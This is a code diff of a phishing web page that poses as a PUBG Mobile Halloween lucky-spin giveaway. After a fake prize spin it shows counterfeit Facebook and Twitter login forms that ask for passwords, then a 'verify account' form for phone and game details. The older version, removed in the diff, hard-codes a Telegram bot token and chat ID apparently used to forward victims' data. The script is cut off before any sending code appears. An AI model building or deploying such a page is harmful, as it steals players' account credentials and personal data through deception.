@@ -1,1110 +1,875 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PUBG MOBILE METRO ROYALE PASS</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
         
         body {
-            background: #000;
+            background-color: #000;
             color: #fff;
             min-height: 100vh;
             overflow-x: hidden;
-            background-image: 
-                radial-gradient(circle at 20% 30%, rgba(120, 119, 198, 0.1) 0%, transparent 20%),
-                radial-gradient(circle at 80% 70%, rgba(255, 119, 198, 0.05) 0%, transparent 20%);
         }
         
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
-            padding: 20px;
-            position: relative;
+        /* Два фона */
+        .background-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
         }
         
-        /* Header Styles from IMG_0076 */
+        .background-top {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 50%;
+            background-image: url('phon1.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+        
+        .background-bottom {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 50%;
+            background-image: url('phon2.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+        
+        /* Заголовок сайта */
         .header {
             text-align: center;
-            padding: 20px 0 30px 0;
+            padding: 20px;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.8), rgba(0,0,0,0));
             position: relative;
+            z-index: 1;
         }
         
         .main-title {
-            font-size: 52px;
-            font-weight: 900;
-            color: #fff;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            text-shadow: 
-                0 0 10px rgba(255, 215, 0, 0.8),
-                0 0 20px rgba(255, 140, 0, 0.6),
-                0 0 30px rgba(255, 69, 0, 0.4);
-            margin-bottom: 5px;
-            background: linear-gradient(to right, #FFD700, #FF8C00, #FF4500);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        
-        .subtitle {
-            font-size: 24px;
-            font-weight: bold;
-            color: #FFD700;
-            text-transform: uppercase;
+            font-size: 3.5rem;
+            color: #ffcc00;
+            text-shadow: 0 0 10px #ff9900, 0 0 20px #ff6600;
+            margin-bottom: 10px;
             letter-spacing: 2px;
-            margin-bottom: 15px;
         }
         
-        .pubg-banner {
-            background: linear-gradient(90deg, #8B0000 0%, #B22222 50%, #8B0000 100%);
-            padding: 12px;
-            border-radius: 8px;
-            margin: 15px auto 25px auto;
-            border: 2px solid #FFD700;
-            box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
-            max-width: 600px;
-            position: relative;
+        .sub-title {
+            font-size: 1.8rem;
+            color: #fff;
+            margin-bottom: 5px;
         }
         
-        .banner-text {
-            font-size: 22px;
-            font-weight: bold;
-            color: #FFD700;
-            text-align: center;
-            text-transform: uppercase;
+        .pass-title {
+            font-size: 1.4rem;
+            color: #ffcc00;
+            margin-bottom: 20px;
             letter-spacing: 1px;
         }
         
-        .congrats-text {
-            font-size: 20px;
-            color: #fff;
-            text-align: center;
-            font-weight: bold;
-            margin-top: 5px;
-        }
-        
-        /* Wheel Section */
-        .wheel-section {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 30px;
-            margin: 30px 0;
-            justify-content: center;
-        }
-        
-        .wheel-container {
-            flex: 1;
-            min-width: 300px;
-            max-width: 500px;
-            position: relative;
+        /* Контейнер для рулетки */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
             padding: 20px;
-            background: rgba(20, 20, 40, 0.7);
-            border-radius: 15px;
-            border: 2px solid #444;
-        }
-        
-        .wheel {
-            width: 100%;
-            height: auto;
-            border-radius: 50%;
-            transition: transform 4s cubic-bezier(0.17, 0.67, 0.83, 0.67);
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
-            border: 5px solid #FFD700;
-        }
-        
-        .wheel-center {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 70px;
-            height: 70px;
-            background: #8B0000;
-            border-radius: 50%;
-            border: 5px solid #FFD700;
-            cursor: pointer;
             display: flex;
+            flex-direction: column;
             align-items: center;
-            justify-content: center;
-            z-index: 10;
-            box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
+            position: relative;
+            z-index: 1;
         }
         
-        .wheel-center span {
-            font-size: 14px;
-            font-weight: bold;
-            color: #FFD700;
-            text-align: center;
-            text-transform: uppercase;
+        .roulette-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 30px;
+            width: 100%;
         }
         
-        .pointer {
-            position: absolute;
-            top: -15px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 40px;
-            height: 40px;
-            background: #FFD700;
-            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
-            z-index: 5;
-            filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.8));
-        }
-        
-        .spin-btn-container {
-            text-align: center;
+        .roulette-container {
+            position: relative;
+            width: 500px;
+            height: 500px;
             margin: 20px 0;
         }
         
-        .spin-btn {
-            padding: 15px 40px;
-            background: linear-gradient(90deg, #8B0000 0%, #B22222 100%);
-            color: #FFD700;
+        .roulette-wheel {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 8px solid #8b4513;
+            box-shadow: 0 0 30px rgba(255, 204, 0, 0.7);
+        }
+        
+        .roulette-image {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            transition: transform 4s cubic-bezier(0.17, 0.67, 0.21, 0.99);
+        }
+        
+        .roulette-pointer {
+            position: absolute;
+            top: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 60px;
+            z-index: 10;
+            filter: drop-shadow(0 0 5px gold);
+        }
+        
+        .spin-button {
+            background: linear-gradient(to bottom, #ffcc00, #ff9900);
+            color: #000;
             border: none;
-            border-radius: 25px;
-            font-size: 20px;
+            padding: 15px 40px;
+            font-size: 1.5rem;
             font-weight: bold;
+            border-radius: 50px;
             cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            box-shadow: 0 5px 15px rgba(139, 0, 0, 0.5);
+            margin-top: 20px;
+            box-shadow: 0 5px 15px rgba(255, 204, 0, 0.5);
             transition: all 0.3s;
-            border: 2px solid #FFD700;
         }
         
-        .spin-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(139, 0, 0, 0.7);
+        .spin-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 20px rgba(255, 204, 0, 0.7);
         }
         
-        .spin-btn:disabled {
-            opacity: 0.6;
+        .spin-button:disabled {
+            background: linear-gradient(to bottom, #666, #444);
+            color: #999;
             cursor: not-allowed;
             transform: none;
+            box-shadow: none;
         }
         
-        /* Prizes Section */
-        .prizes-section {
-            flex: 1;
-            min-width: 300px;
-            background: rgba(10, 10, 30, 0.8);
-            border-radius: 15px;
-            padding: 25px;
-            border: 2px solid #444;
-        }
-        
-        .section-title {
-            font-size: 24px;
-            color: #FFD700;
-            margin-bottom: 20px;
-            text-align: center;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            border-bottom: 2px solid #FFD700;
-            padding-bottom: 10px;
-        }
-        
+        /* Сетка призов */
         .prizes-grid {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
+            grid-template-columns: repeat(4, 1fr);
             gap: 15px;
-            margin-bottom: 25px;
+            margin-top: 30px;
+            width: 100%;
+            max-width: 800px;
         }
         
         .prize-item {
-            background: rgba(30, 30, 50, 0.9);
-            border-radius: 8px;
-            padding: 12px;
+            background: rgba(30, 30, 30, 0.8);
+            border-radius: 10px;
+            padding: 10px;
             text-align: center;
-            border: 1px solid #555;
+            border: 2px solid #444;
             transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
         }
         
         .prize-item:hover {
+            border-color: #ffcc00;
             transform: translateY(-5px);
-            border-color: #FFD700;
-            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
         }
         
-        .prize-item img {
-            width: 70px;
-            height: 70px;
-            object-fit: cover;
+        .prize-image {
+            width: 100%;
+            height: 100px;
+            object-fit: contain;
             border-radius: 5px;
-            margin-bottom: 8px;
-            background: #222;
-            padding: 3px;
-            border: 1px solid #666;
-        }
-        
-        .prize-item.winner {
-            border-color: #FFD700;
-            box-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
-            background: rgba(139, 0, 0, 0.3);
+            margin-bottom: 10px;
         }
         
         .prize-name {
-            font-size: 12px;
-            color: #fff;
-            font-weight: bold;
+            font-size: 0.9rem;
+            color: #ffcc00;
         }
         
-        /* Login Section from IMG_0077 */
-        .login-section {
-            background: rgba(15, 15, 35, 0.9);
-            padding: 25px;
-            border-radius: 12px;
-            margin-top: 20px;
-            border: 2px solid #555;
-        }
-        
-        .login-title {
-            font-size: 22px;
-            color: #FFD700;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-        
-        .login-subtitle {
-            font-size: 18px;
-            color: #fff;
-            text-align: center;
-            margin-bottom: 20px;
-            font-weight: bold;
-        }
-        
-        .login-options {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin: 25px 0;
-            flex-wrap: wrap;
-        }
-        
-        .login-option {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 12px 25px;
-            background: rgba(40, 40, 60, 0.9);
-            border-radius: 8px;
-            border: 2px solid #666;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .login-option:hover {
-            border-color: #FFD700;
-            background: rgba(60, 60, 80, 0.9);
-        }
-        
-        .login-option.selected {
-            border-color: #FFD700;
-            background: rgba(139, 0, 0, 0.3);
-        }
-        
-        .checkbox {
-            width: 20px;
-            height: 20px;
-            border: 2px solid #FFD700;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .checkbox.checked:after {
-            content: "✓";
-            color: #FFD700;
-            font-weight: bold;
-        }
-        
-        .login-label {
-            font-size: 18px;
-            color: #fff;
-            font-weight: bold;
-        }
-        
-        .login-form {
-            background: rgba(25, 25, 45, 0.9);
-            padding: 25px;
-            border-radius: 10px;
-            margin-top: 20px;
+        /* Форма авторизации */
+        .auth-section {
+            background: rgba(20, 20, 20, 0.9);
+            border-radius: 15px;
+            padding: 30px;
+            width: 100%;
+            max-width: 500px;
+            margin: 30px auto;
+            border: 2px solid #444;
             display: none;
         }
         
-        .form-title {
-            color: #1877F2;
-            font-size: 20px;
-            margin-bottom: 20px;
+        .auth-title {
             text-align: center;
+            font-size: 1.8rem;
+            color: #ffcc00;
+            margin-bottom: 20px;
         }
         
-        .form-description {
-            color: #ccc;
+        .auth-options {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .auth-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: #3b5998;
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: bold;
+            width: 200px;
+            transition: all 0.3s;
+        }
+        
+        .auth-button.twitter {
+            background: #1da1f2;
+        }
+        
+        .auth-button:hover {
+            opacity: 0.9;
+            transform: scale(1.03);
+        }
+        
+        .auth-button img {
+            width: 24px;
+            height: 24px;
+        }
+        
+        /* Форма Facebook */
+        .facebook-form {
+            background: white;
+            color: #333;
+            border-radius: 8px;
+            padding: 25px;
+            display: none;
+            margin-top: 20px;
+        }
+        
+        .facebook-logo {
             text-align: center;
+            color: #3b5998;
+            font-size: 2.5rem;
+            font-weight: bold;
             margin-bottom: 20px;
-            font-size: 16px;
         }
         
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         
-        .form-label {
+        .form-group label {
             display: block;
-            margin-bottom: 8px;
-            color: #FFD700;
-            font-size: 16px;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+            color: #606770;
         }
         
-        .form-input {
+        .form-group input {
             width: 100%;
-            padding: 12px 15px;
+            padding: 12px;
+            border: 1px solid #dddfe2;
             border-radius: 6px;
-            border: 1px solid #555;
-            background: rgba(10, 10, 20, 0.9);
-            color: white;
-            font-size: 16px;
+            font-size: 1rem;
         }
         
-        .form-input:focus {
-            outline: none;
-            border-color: #1877F2;
-        }
-        
-        .form-submit {
+        .login-button {
             width: 100%;
-            padding: 15px;
-            background: #1877F2;
+            background: #1877f2;
             color: white;
             border: none;
+            padding: 12px;
             border-radius: 6px;
-            font-size: 18px;
+            font-size: 1.1rem;
             font-weight: bold;
             cursor: pointer;
             margin-top: 10px;
         }
         
+        .login-button:hover {
+            background: #166fe5;
+        }
+        
         .form-links {
-            display: flex;
-            justify-content: space-between;
+            text-align: center;
             margin-top: 15px;
-            font-size: 14px;
+            padding-top: 15px;
+            border-top: 1px solid #dddfe2;
         }
         
-        .form-link {
-            color: #aaa;
+        .form-links a {
+            color: #1877f2;
             text-decoration: none;
+            font-size: 0.9rem;
         }
         
-        .form-link:hover {
-            color: #FFD700;
+        .form-links a:hover {
             text-decoration: underline;
         }
         
-        .languages {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 15px;
-            justify-content: center;
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid #444;
-            color: #aaa;
-            font-size: 14px;
-        }
-        
-        /* Verify Section from IMG_0078 */
+        /* Форма верификации */
         .verify-section {
-            background: rgba(15, 15, 35, 0.9);
+            background: rgba(20, 20, 20, 0.9);
+            border-radius: 15px;
             padding: 30px;
-            border-radius: 12px;
-            margin-top: 25px;
-            border: 2px solid #555;
+            width: 100%;
+            max-width: 500px;
+            margin: 30px auto;
+            border: 2px solid #444;
             display: none;
         }
         
         .verify-title {
-            font-size: 28px;
-            color: #FFD700;
-            margin-bottom: 25px;
             text-align: center;
-            text-transform: uppercase;
+            font-size: 1.8rem;
+            color: #ffcc00;
+            margin-bottom: 20px;
         }
         
-        .verify-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 20px;
-            margin: 25px 0;
+        .verify-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
         }
         
-        .verify-item {
-            background: rgba(30, 30, 50, 0.9);
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px solid #555;
+        .verify-form input, .verify-form select {
+            padding: 12px;
+            border-radius: 6px;
+            border: 1px solid #444;
+            background: rgba(40, 40, 40, 0.9);
+            color: white;
+            font-size: 1rem;
         }
         
-        .verify-label {
-            color: #FFD700;
-            font-size: 16px;
-            margin-bottom: 8px;
-            font-weight: bold;
-        }
-        
-        .verify-value {
-            color: #fff;
-            font-size: 18px;
-            font-weight: bold;
-        }
-        
-        .verify-submit {
-            display: block;
-            width: 200px;
-            margin: 30px auto 0;
-            padding: 15px;
-            background: linear-gradient(90deg, #8B0000 0%, #B22222 100%);
-            color: #FFD700;
+        .submit-button {
+            background: linear-gradient(to bottom, #ffcc00, #ff9900);
+            color: #000;
             border: none;
-            border-radius: 8px;
-            font-size: 18px;
+            padding: 15px;
+            font-size: 1.2rem;
             font-weight: bold;
+            border-radius: 8px;
             cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            border: 2px solid #FFD700;
+            margin-top: 10px;
         }
         
-        /* Success Section */
-        .success-section {
-            background: rgba(0, 50, 0, 0.8);
-            padding: 30px;
-            border-radius: 12px;
-            margin-top: 25px;
-            border: 2px solid #00aa00;
+        .submit-button:hover {
+            opacity: 0.9;
+        }
+        
+        /* Поздравление */
+        .congrats-section {
+            background: rgba(20, 20, 20, 0.95);
+            border-radius: 15px;
+            padding: 40px;
+            width: 100%;
+            max-width: 600px;
+            margin: 30px auto;
+            border: 3px solid #ffcc00;
+            text-align: center;
             display: none;
         }
         
-        .success-title {
-            font-size: 28px;
-            color: #00ff00;
+        .congrats-title {
+            font-size: 2.5rem;
+            color: #ffcc00;
             margin-bottom: 20px;
-            text-align: center;
-            text-transform: uppercase;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.7);
         }
         
-        .success-message {
-            font-size: 18px;
-            color: #fff;
-            text-align: center;
+        .congrats-text {
+            font-size: 1.2rem;
             line-height: 1.6;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
         }
         
-        .process-url {
-            text-align: center;
-            color: #FFD700;
-            margin: 20px 0;
-            font-size: 14px;
+        .prize-won {
+            margin: 30px 0;
+            padding: 20px;
+            background: rgba(255, 204, 0, 0.1);
+            border-radius: 10px;
+            border: 2px solid #ffcc00;
         }
         
-        /* Footer Section */
-        .footer {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 40px;
-            padding-top: 20px;
-            border-top: 1px solid #444;
-            flex-wrap: wrap;
+        .prize-won-image {
+            max-width: 200px;
+            max-height: 150px;
+            object-fit: contain;
+            margin-bottom: 15px;
         }
         
-        .footer-logo {
-            font-size: 24px;
+        .prize-won-name {
+            font-size: 1.5rem;
+            color: #ffcc00;
             font-weight: bold;
-            color: #FFD700;
-            text-transform: uppercase;
         }
         
-        .footer-event {
-            font-size: 18px;
-            color: #fff;
+        /* Футер */
+        .footer {
             text-align: center;
+            padding: 20px;
+            margin-top: 30px;
+            border-top: 1px solid #333;
+            font-size: 0.9rem;
+            color: #888;
+            position: relative;
+            z-index: 1;
         }
         
-        .footer-copyright {
-            font-size: 14px;
-            color: #aaa;
-            text-align: right;
+        .pubg-logo {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #ffcc00;
+            margin-bottom: 10px;
         }
         
-        .spinning {
-            animation: spinBlink 0.5s infinite alternate;
-        }
-        
-        @keyframes spinBlink {
-            from { box-shadow: 0 0 10px rgba(255, 215, 0, 0.7); }
-            to { box-shadow: 0 0 30px rgba(255, 215, 0, 1); }
-        }
-        
+        /* Адаптивность */
         @media (max-width: 768px) {
-            .wheel-section {
+            .main-title {
+                font-size: 2.5rem;
+            }
+            
+            .roulette-container {
+                width: 350px;
+                height: 350px;
+            }
+            
+            .prizes-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            
+            .auth-options {
                 flex-direction: column;
+                align-items: center;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .main-title {
+                font-size: 2rem;
+            }
+            
+            .roulette-container {
+                width: 300px;
+                height: 300px;
             }
             
             .prizes-grid {
                 grid-template-columns: repeat(2, 1fr);
             }
             
-            .verify-grid {
-                grid-template-columns: 1fr;
+            .container {
+                padding: 10px;
             }
-            
-            .footer {
-                flex-direction: column;
-                gap: 15px;
-                text-align: center;
-            }
-        }
-        
-        /* Telegram bot info */
-        .telegram-info {
-            background: rgba(0, 100, 150, 0.2);
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 20px;
-            border-left: 4px solid #0088cc;
         }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
+    <div class="background-container">
+        <div class="background-top"></div>
+        <div class="background-bottom"></div>
+    </div>
+    
+    <div class="header">
+        <h1 class="main-title">MEXICO ROYAL</h1>
+        <h2 class="sub-title">ROYALE PASS S</h2>
+        <div class="pass-title">PUBG MOBILE METRO ROYALE PASS SIG</div>
+    </div>
+    
     <div class="container">
-        <!-- Header from IMG_0076 -->
-        <div class="header">
-            <div class="main-title">MEXICO ROYAL</div>
-            <div class="subtitle">ROYALE PASS S</div>
+        <div class="roulette-section">
+            <h2 style="color: #ffcc00; margin-bottom: 20px; font-size: 2rem;">PUBG MOBILE LUCKY SPIN HALLOWEEN EVENT</h2>
             
-            <div class="pubg-banner">
-                <div class="banner-text">PUBG MOBILE METRO ROYALE PASS SIG</div>
-                <div class="congrats-text">Congratulations</div>
+            <div class="roulette-container">
+                <img src="roulette-pointer.png" alt="Pointer" class="roulette-pointer">
+                <div class="roulette-wheel">
+                    <img src="roulette.jpg" alt="Roulette" class="roulette-image" id="rouletteImage">
+                </div>
             </div>
             
-            <div class="spin-btn-container">
-                <button class="spin-btn" id="spinButton">SPIN TO WIN</button>
+            <button class="spin-button" id="spinButton">SPIN ROULETTE</button>
+            
+            <div class="prizes-grid" id="prizesGrid">
+                <!-- Призы будут добавлены через JavaScript -->
             </div>
         </div>
         
-        <div class="wheel-section">
-            <!-- Wheel Container -->
-            <div class="wheel-container">
-                <div class="pointer"></div>
-                <img src="https://i.imgur.com/wheel-placeholder.png" alt="Wheel" class="wheel" id="wheel">
-                <div class="wheel-center" id="spinCenter">
-                    <span>SPIN<br>WHEEL</span>
-                </div>
-                
-                <!-- Winner Display -->
-                <div id="winnerSection" style="display: none; text-align: center; margin-top: 20px; padding: 15px; background: rgba(139,0,0,0.3); border-radius: 10px; border: 2px solid #FFD700;">
-                    <h3 style="color: #FFD700; margin-bottom: 10px;">YOU WON!</h3>
-                    <img id="winnerImage" src="" alt="Prize" style="width: 100px; height: 100px; border-radius: 8px; border: 2px solid #FFD700; margin-bottom: 10px;">
-                    <div id="winnerPrize" style="font-size: 20px; color: #FFD700; font-weight: bold;"></div>
-                </div>
+        <div class="auth-section" id="authSection">
+            <h2 class="auth-title">Login to receive reward</h2>
+            <div class="auth-options">
+                <button class="auth-button" id="facebookAuth">
+                    <i class="fab fa-facebook-f"></i> Login With Facebook
+                </button>
+                <button class="auth-button twitter" id="twitterAuth">
+                    <i class="fab fa-twitter"></i> Login With Twitter
+                </button>
             </div>
             
-            <!-- Prizes Section -->
-            <div class="prizes-section">
-                <h3 class="section-title">Available Prizes</h3>
-                <div class="prizes-grid" id="prizesGrid">
-                    <!-- Prizes will be loaded by JavaScript -->
+            <div class="facebook-form" id="facebookForm">
+                <div class="facebook-logo">facebook</div>
+                <p style="text-align: center; margin-bottom: 20px; color: #333;">
+                    Log in to your Facebook account to connect to PUBG MOBILE
+                </p>
+                
+                <div class="form-group">
+                    <label for="fbEmail">Mobile number or email address</label>
+                    <input type="text" id="fbEmail" placeholder="Email or phone">
                 </div>
                 
-                <!-- Login Section from IMG_0077 -->
-                <div class="login-section" id="loginSection">
-                    <h3 class="login-title">PUBG MOBILE METRO ROYALE PASS SIG</h3>
-                    <div class="login-subtitle">Login to receive reward</div>
-                    
-                    <div class="login-options">
-                        <div class="login-option" id="facebookOption">
-                            <div class="checkbox" id="fbCheckbox"></div>
-                            <div class="login-label">Login With Facebook</div>
-                        </div>
-                        <div class="login-option" id="twitterOption">
-                            <div class="checkbox" id="twCheckbox"></div>
-                            <div class="login-label">Login With Twitter</div>
-                        </div>
-                    </div>
-                    
-                    <!-- Facebook Login Form -->
-                    <div class="login-form" id="facebookForm">
-                        <div class="form-title">facebook</div>
-                        <div class="form-description">Log in to your Facebook account to connect to PUBG MOBILE</div>
-                        
-                        <div class="form-group">
-                            <label class="form-label">Mobile number or email address</label>
-                            <input type="text" class="form-input" id="fbEmail" placeholder="Enter email or phone">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label class="form-label">Password</label>
-                            <input type="password" class="form-input" id="fbPassword" placeholder="Enter password">
-                        </div>
-                        
-                        <button class="form-submit" id="fbSubmit">Log In</button>
-                        
-                        <div class="form-links">
-                            <a href="#" class="form-link">Create account</a>
-                            <a href="#" class="form-link">Not now</a>
-                            <a href="#" class="form-link">Forgotten password?</a>
-                        </div>
-                        
-                        <div class="languages">
-                            <span>English (UK)</span>
-                            <span>Basa Jawa</span>
-                            <span>日本語</span>
-                            <span>Portugues (Brasil)</span>
-                            <span>Facebook Inc.</span>
-                            <span>Bahasa Indonesia</span>
-                            <span>Bahasa Melayu</span>
-                            <span>Español</span>
-                        </div>
-                    </div>
-                    
-                    <!-- Twitter Login Form -->
-                    <div class="login-form" id="twitterForm">
-                        <div class="form-title">Twitter Login</div>
-                        <div class="form-description">Log in to your Twitter account to connect to PUBG MOBILE</div>
-                        
-                        <div class="form-group">
-                            <label class="form-label">Username or email</label>
-                            <input type="text" class="form-input" id="twUsername" placeholder="Enter username or email">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label class="form-label">Password</label>
-                            <input type="password" class="form-input" id="twPassword" placeholder="Enter password">
-                        </div>
-                        
-                        <button class="form-submit" id="twSubmit">Log In</button>
-                    </div>
+                <div class="form-group">
+                    <label for="fbPassword">Password</label>
+                    <input type="password" id="fbPassword" placeholder="Password">
                 </div>
                 
-                <!-- Verify Section from IMG_0078 -->
-                <div class="verify-section" id="verifySection">
-                    <h2 class="verify-title">VERIFY YOUR ACCOUNT</h2>
-                    
-                    <div class="verify-grid">
-                        <div class="verify-item">
-                            <div class="verify-label">Character ID</div>
-                            <div class="verify-value" id="charId">-</div>
-                        </div>
-                        <div class="verify-item">
-                            <div class="verify-label">Character Name</div>
-                            <div class="verify-value" id="charName">-</div>
-                        </div>
-                        <div class="verify-item">
-                            <div class="verify-label">Phone Number</div>
-                            <div class="verify-value" id="phoneNumber">-</div>
-                        </div>
-                        <div class="verify-item">
-                            <div class="verify-label">Account Level</div>
-                            <div class="verify-value" id="accountLevel">-</div>
-                        </div>
-                        <div class="verify-item">
-                            <div class="verify-label">Ranked Tier Level</div>
-                            <div class="verify-value" id="rankTier">-</div>
-                        </div>
-                        <div class="verify-item">
-                            <div class="verify-label">Royale Pass Type</div>
-                            <div class="verify-value" id="passType">-</div>
-                        </div>
-                        <div class="verify-item">
-                            <div class="verify-label">Royale Pass Level</div>
-                            <div class="verify-value" id="passLevel">-</div>
-                        </div>
-                        <div class="verify-item">
-                            <div class="verify-label">Platform</div>
-                            <div class="verify-value" id="platform">-</div>
-                        </div>
-                    </div>
-                    
-                    <div class="process-url">https://pubg.com/process</div>
-                    
-                    <button class="verify-submit" id="verifySubmit">Submit</button>
+                <button class="login-button" id="fbLoginButton">Log In</button>
+                
+                <div class="form-links">
+                    <a href="#" id="createAccount">Create account</a> • 
+                    <a href="#" id="notNow">Not now</a> • 
+                    <a href="#" id="forgotPassword">Forgotten password?</a>
                 </div>
                 
-                <!-- Success Section -->
-                <div class="success-section" id="successSection">
-                    <h2 class="success-title">Congratulations</h2>
-                    <p class="success-message">
-                        Hi Survivor, your account has been processing to receive your selected rewards. 
-                        Please wait up to 24 hours to receive this rewards in your ingame mailbox.
-                    </p>
-                    
-                    <div class="telegram-info">
-                        <h4 style="color: #0088cc; margin-bottom: 10px;">
-                            <i class="fab fa-telegram"></i> Telegram Notification Sent
-                        </h4>
-                        <p style="color: #fff;">Your prize claim has been sent to the administrator. You will receive your reward soon.</p>
-                    </div>
+                <div style="margin-top: 20px; font-size: 0.8rem; color: #666; text-align: center;">
+                    English (UK) • Basa Jawa • 日本語 • Português (Brasil) • Facebook Inc.<br>
+                    Bahasa Indonesia • Bahasa Melayu • Español
                 </div>
             </div>
         </div>
         
-        <!-- Footer -->
-        <div class="footer">
-            <div class="footer-logo">PUBG ROYAL</div>
-            <div class="footer-event">PROFILE PASS SPIN<br>PUBG MOBILE LUCKY SPIN HALLOWEEN EVENT</div>
-            <div class="footer-copyright">© 2023 PUBG MOBILE. All rights reserved.</div>
+        <div class="verify-section" id="verifySection">
+            <h2 class="verify-title">VERIFY YOUR ACCOUNT</h2>
+            <form class="verify-form" id="verifyForm">
+                <input type="text" placeholder="Character ID" id="characterId" required>
+                <input type="text" placeholder="Character Name" id="characterName" required>
+                <input type="tel" placeholder="Phone Number" id="phoneNumber" required>
+                <input type="number" placeholder="Account Level" id="accountLevel" required>
+                <input type="text" placeholder="Ranked Tier Level" id="rankedTier" required>
+                <select id="royalePassType" required>
+                    <option value="">Royale Pass Type</option>
+                    <option value="free">Free Pass</option>
+                    <option value="premium">Premium Pass</option>
+                    <option value="elite">Elite Pass</option>
+                </select>
+                <input type="number" placeholder="Royale Pass Level" id="royalePassLevel" required>
+                <select id="platform" required>
+                    <option value="">Platform</option>
+                    <option value="android">Android</option>
+                    <option value="ios">iOS</option>
+                    <option value="emulator">Emulator</option>
+                </select>
+                
+                <button type="submit" class="submit-button">Submit</button>
+            </form>
+            
+            <div style="text-align: center; margin-top: 20px; color: #888; font-size: 0.9rem;">
+                6:39 https://pubg.com/process
+            </div>
+        </div>
+        
+        <div class="congrats-section" id="congratsSection">
+            <h2 class="congrats-title">Congratulations</h2>
+            
+            <div class="prize-won">
+                <img src="" alt="Prize" class="prize-won-image" id="wonPrizeImage">
+                <div class="prize-won-name" id="wonPrizeName"></div>
+            </div>
+            
+            <p class="congrats-text">
+                Hi Survivor, your account has been processing to receive your selected rewards. 
+                Please wait up to 24 hours to receive this rewards in your ingame mailbox.
+            </p>
+            
+            <div style="display: flex; justify-content: center; gap: 20px; margin-top: 30px;">
+                <button class="spin-button" style="background: #333; color: white;" id="cancelButton">Cancel</button>
+                <button class="spin-button" id="okButton">OK</button>
+            </div>
         </div>
     </div>
-
+    
+    <div class="footer">
+        <div class="pubg-logo">PUBG</div>
+        <div>ROYAL</div>
+        <div>PROFILE PASS SPIN</div>
+        <div style="margin-top: 10px;">PUBG MOBILE LUCKY SPIN HALLOWEEN EVENT</div>
+        <div style="margin-top: 20px; color: #666;">© 2023 PUBG MOBILE. All rights reserved.</div>
+    </div>
+    
     <script>
-        // Telegram bot credentials
-        const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
-        const TELEGRAM_CHAT_ID = '1709490182';
-        
-        // Prizes data with placeholder images
+        // Призы и их картинки
         const prizes = [
-            { id: 1, name: "Pharaon Skin", image: "pharaon.jpg", code: "PHARAON2023" },
-            { id: 2, name: "Special Material", image: "material.jpg", code: "MATERIALX" },
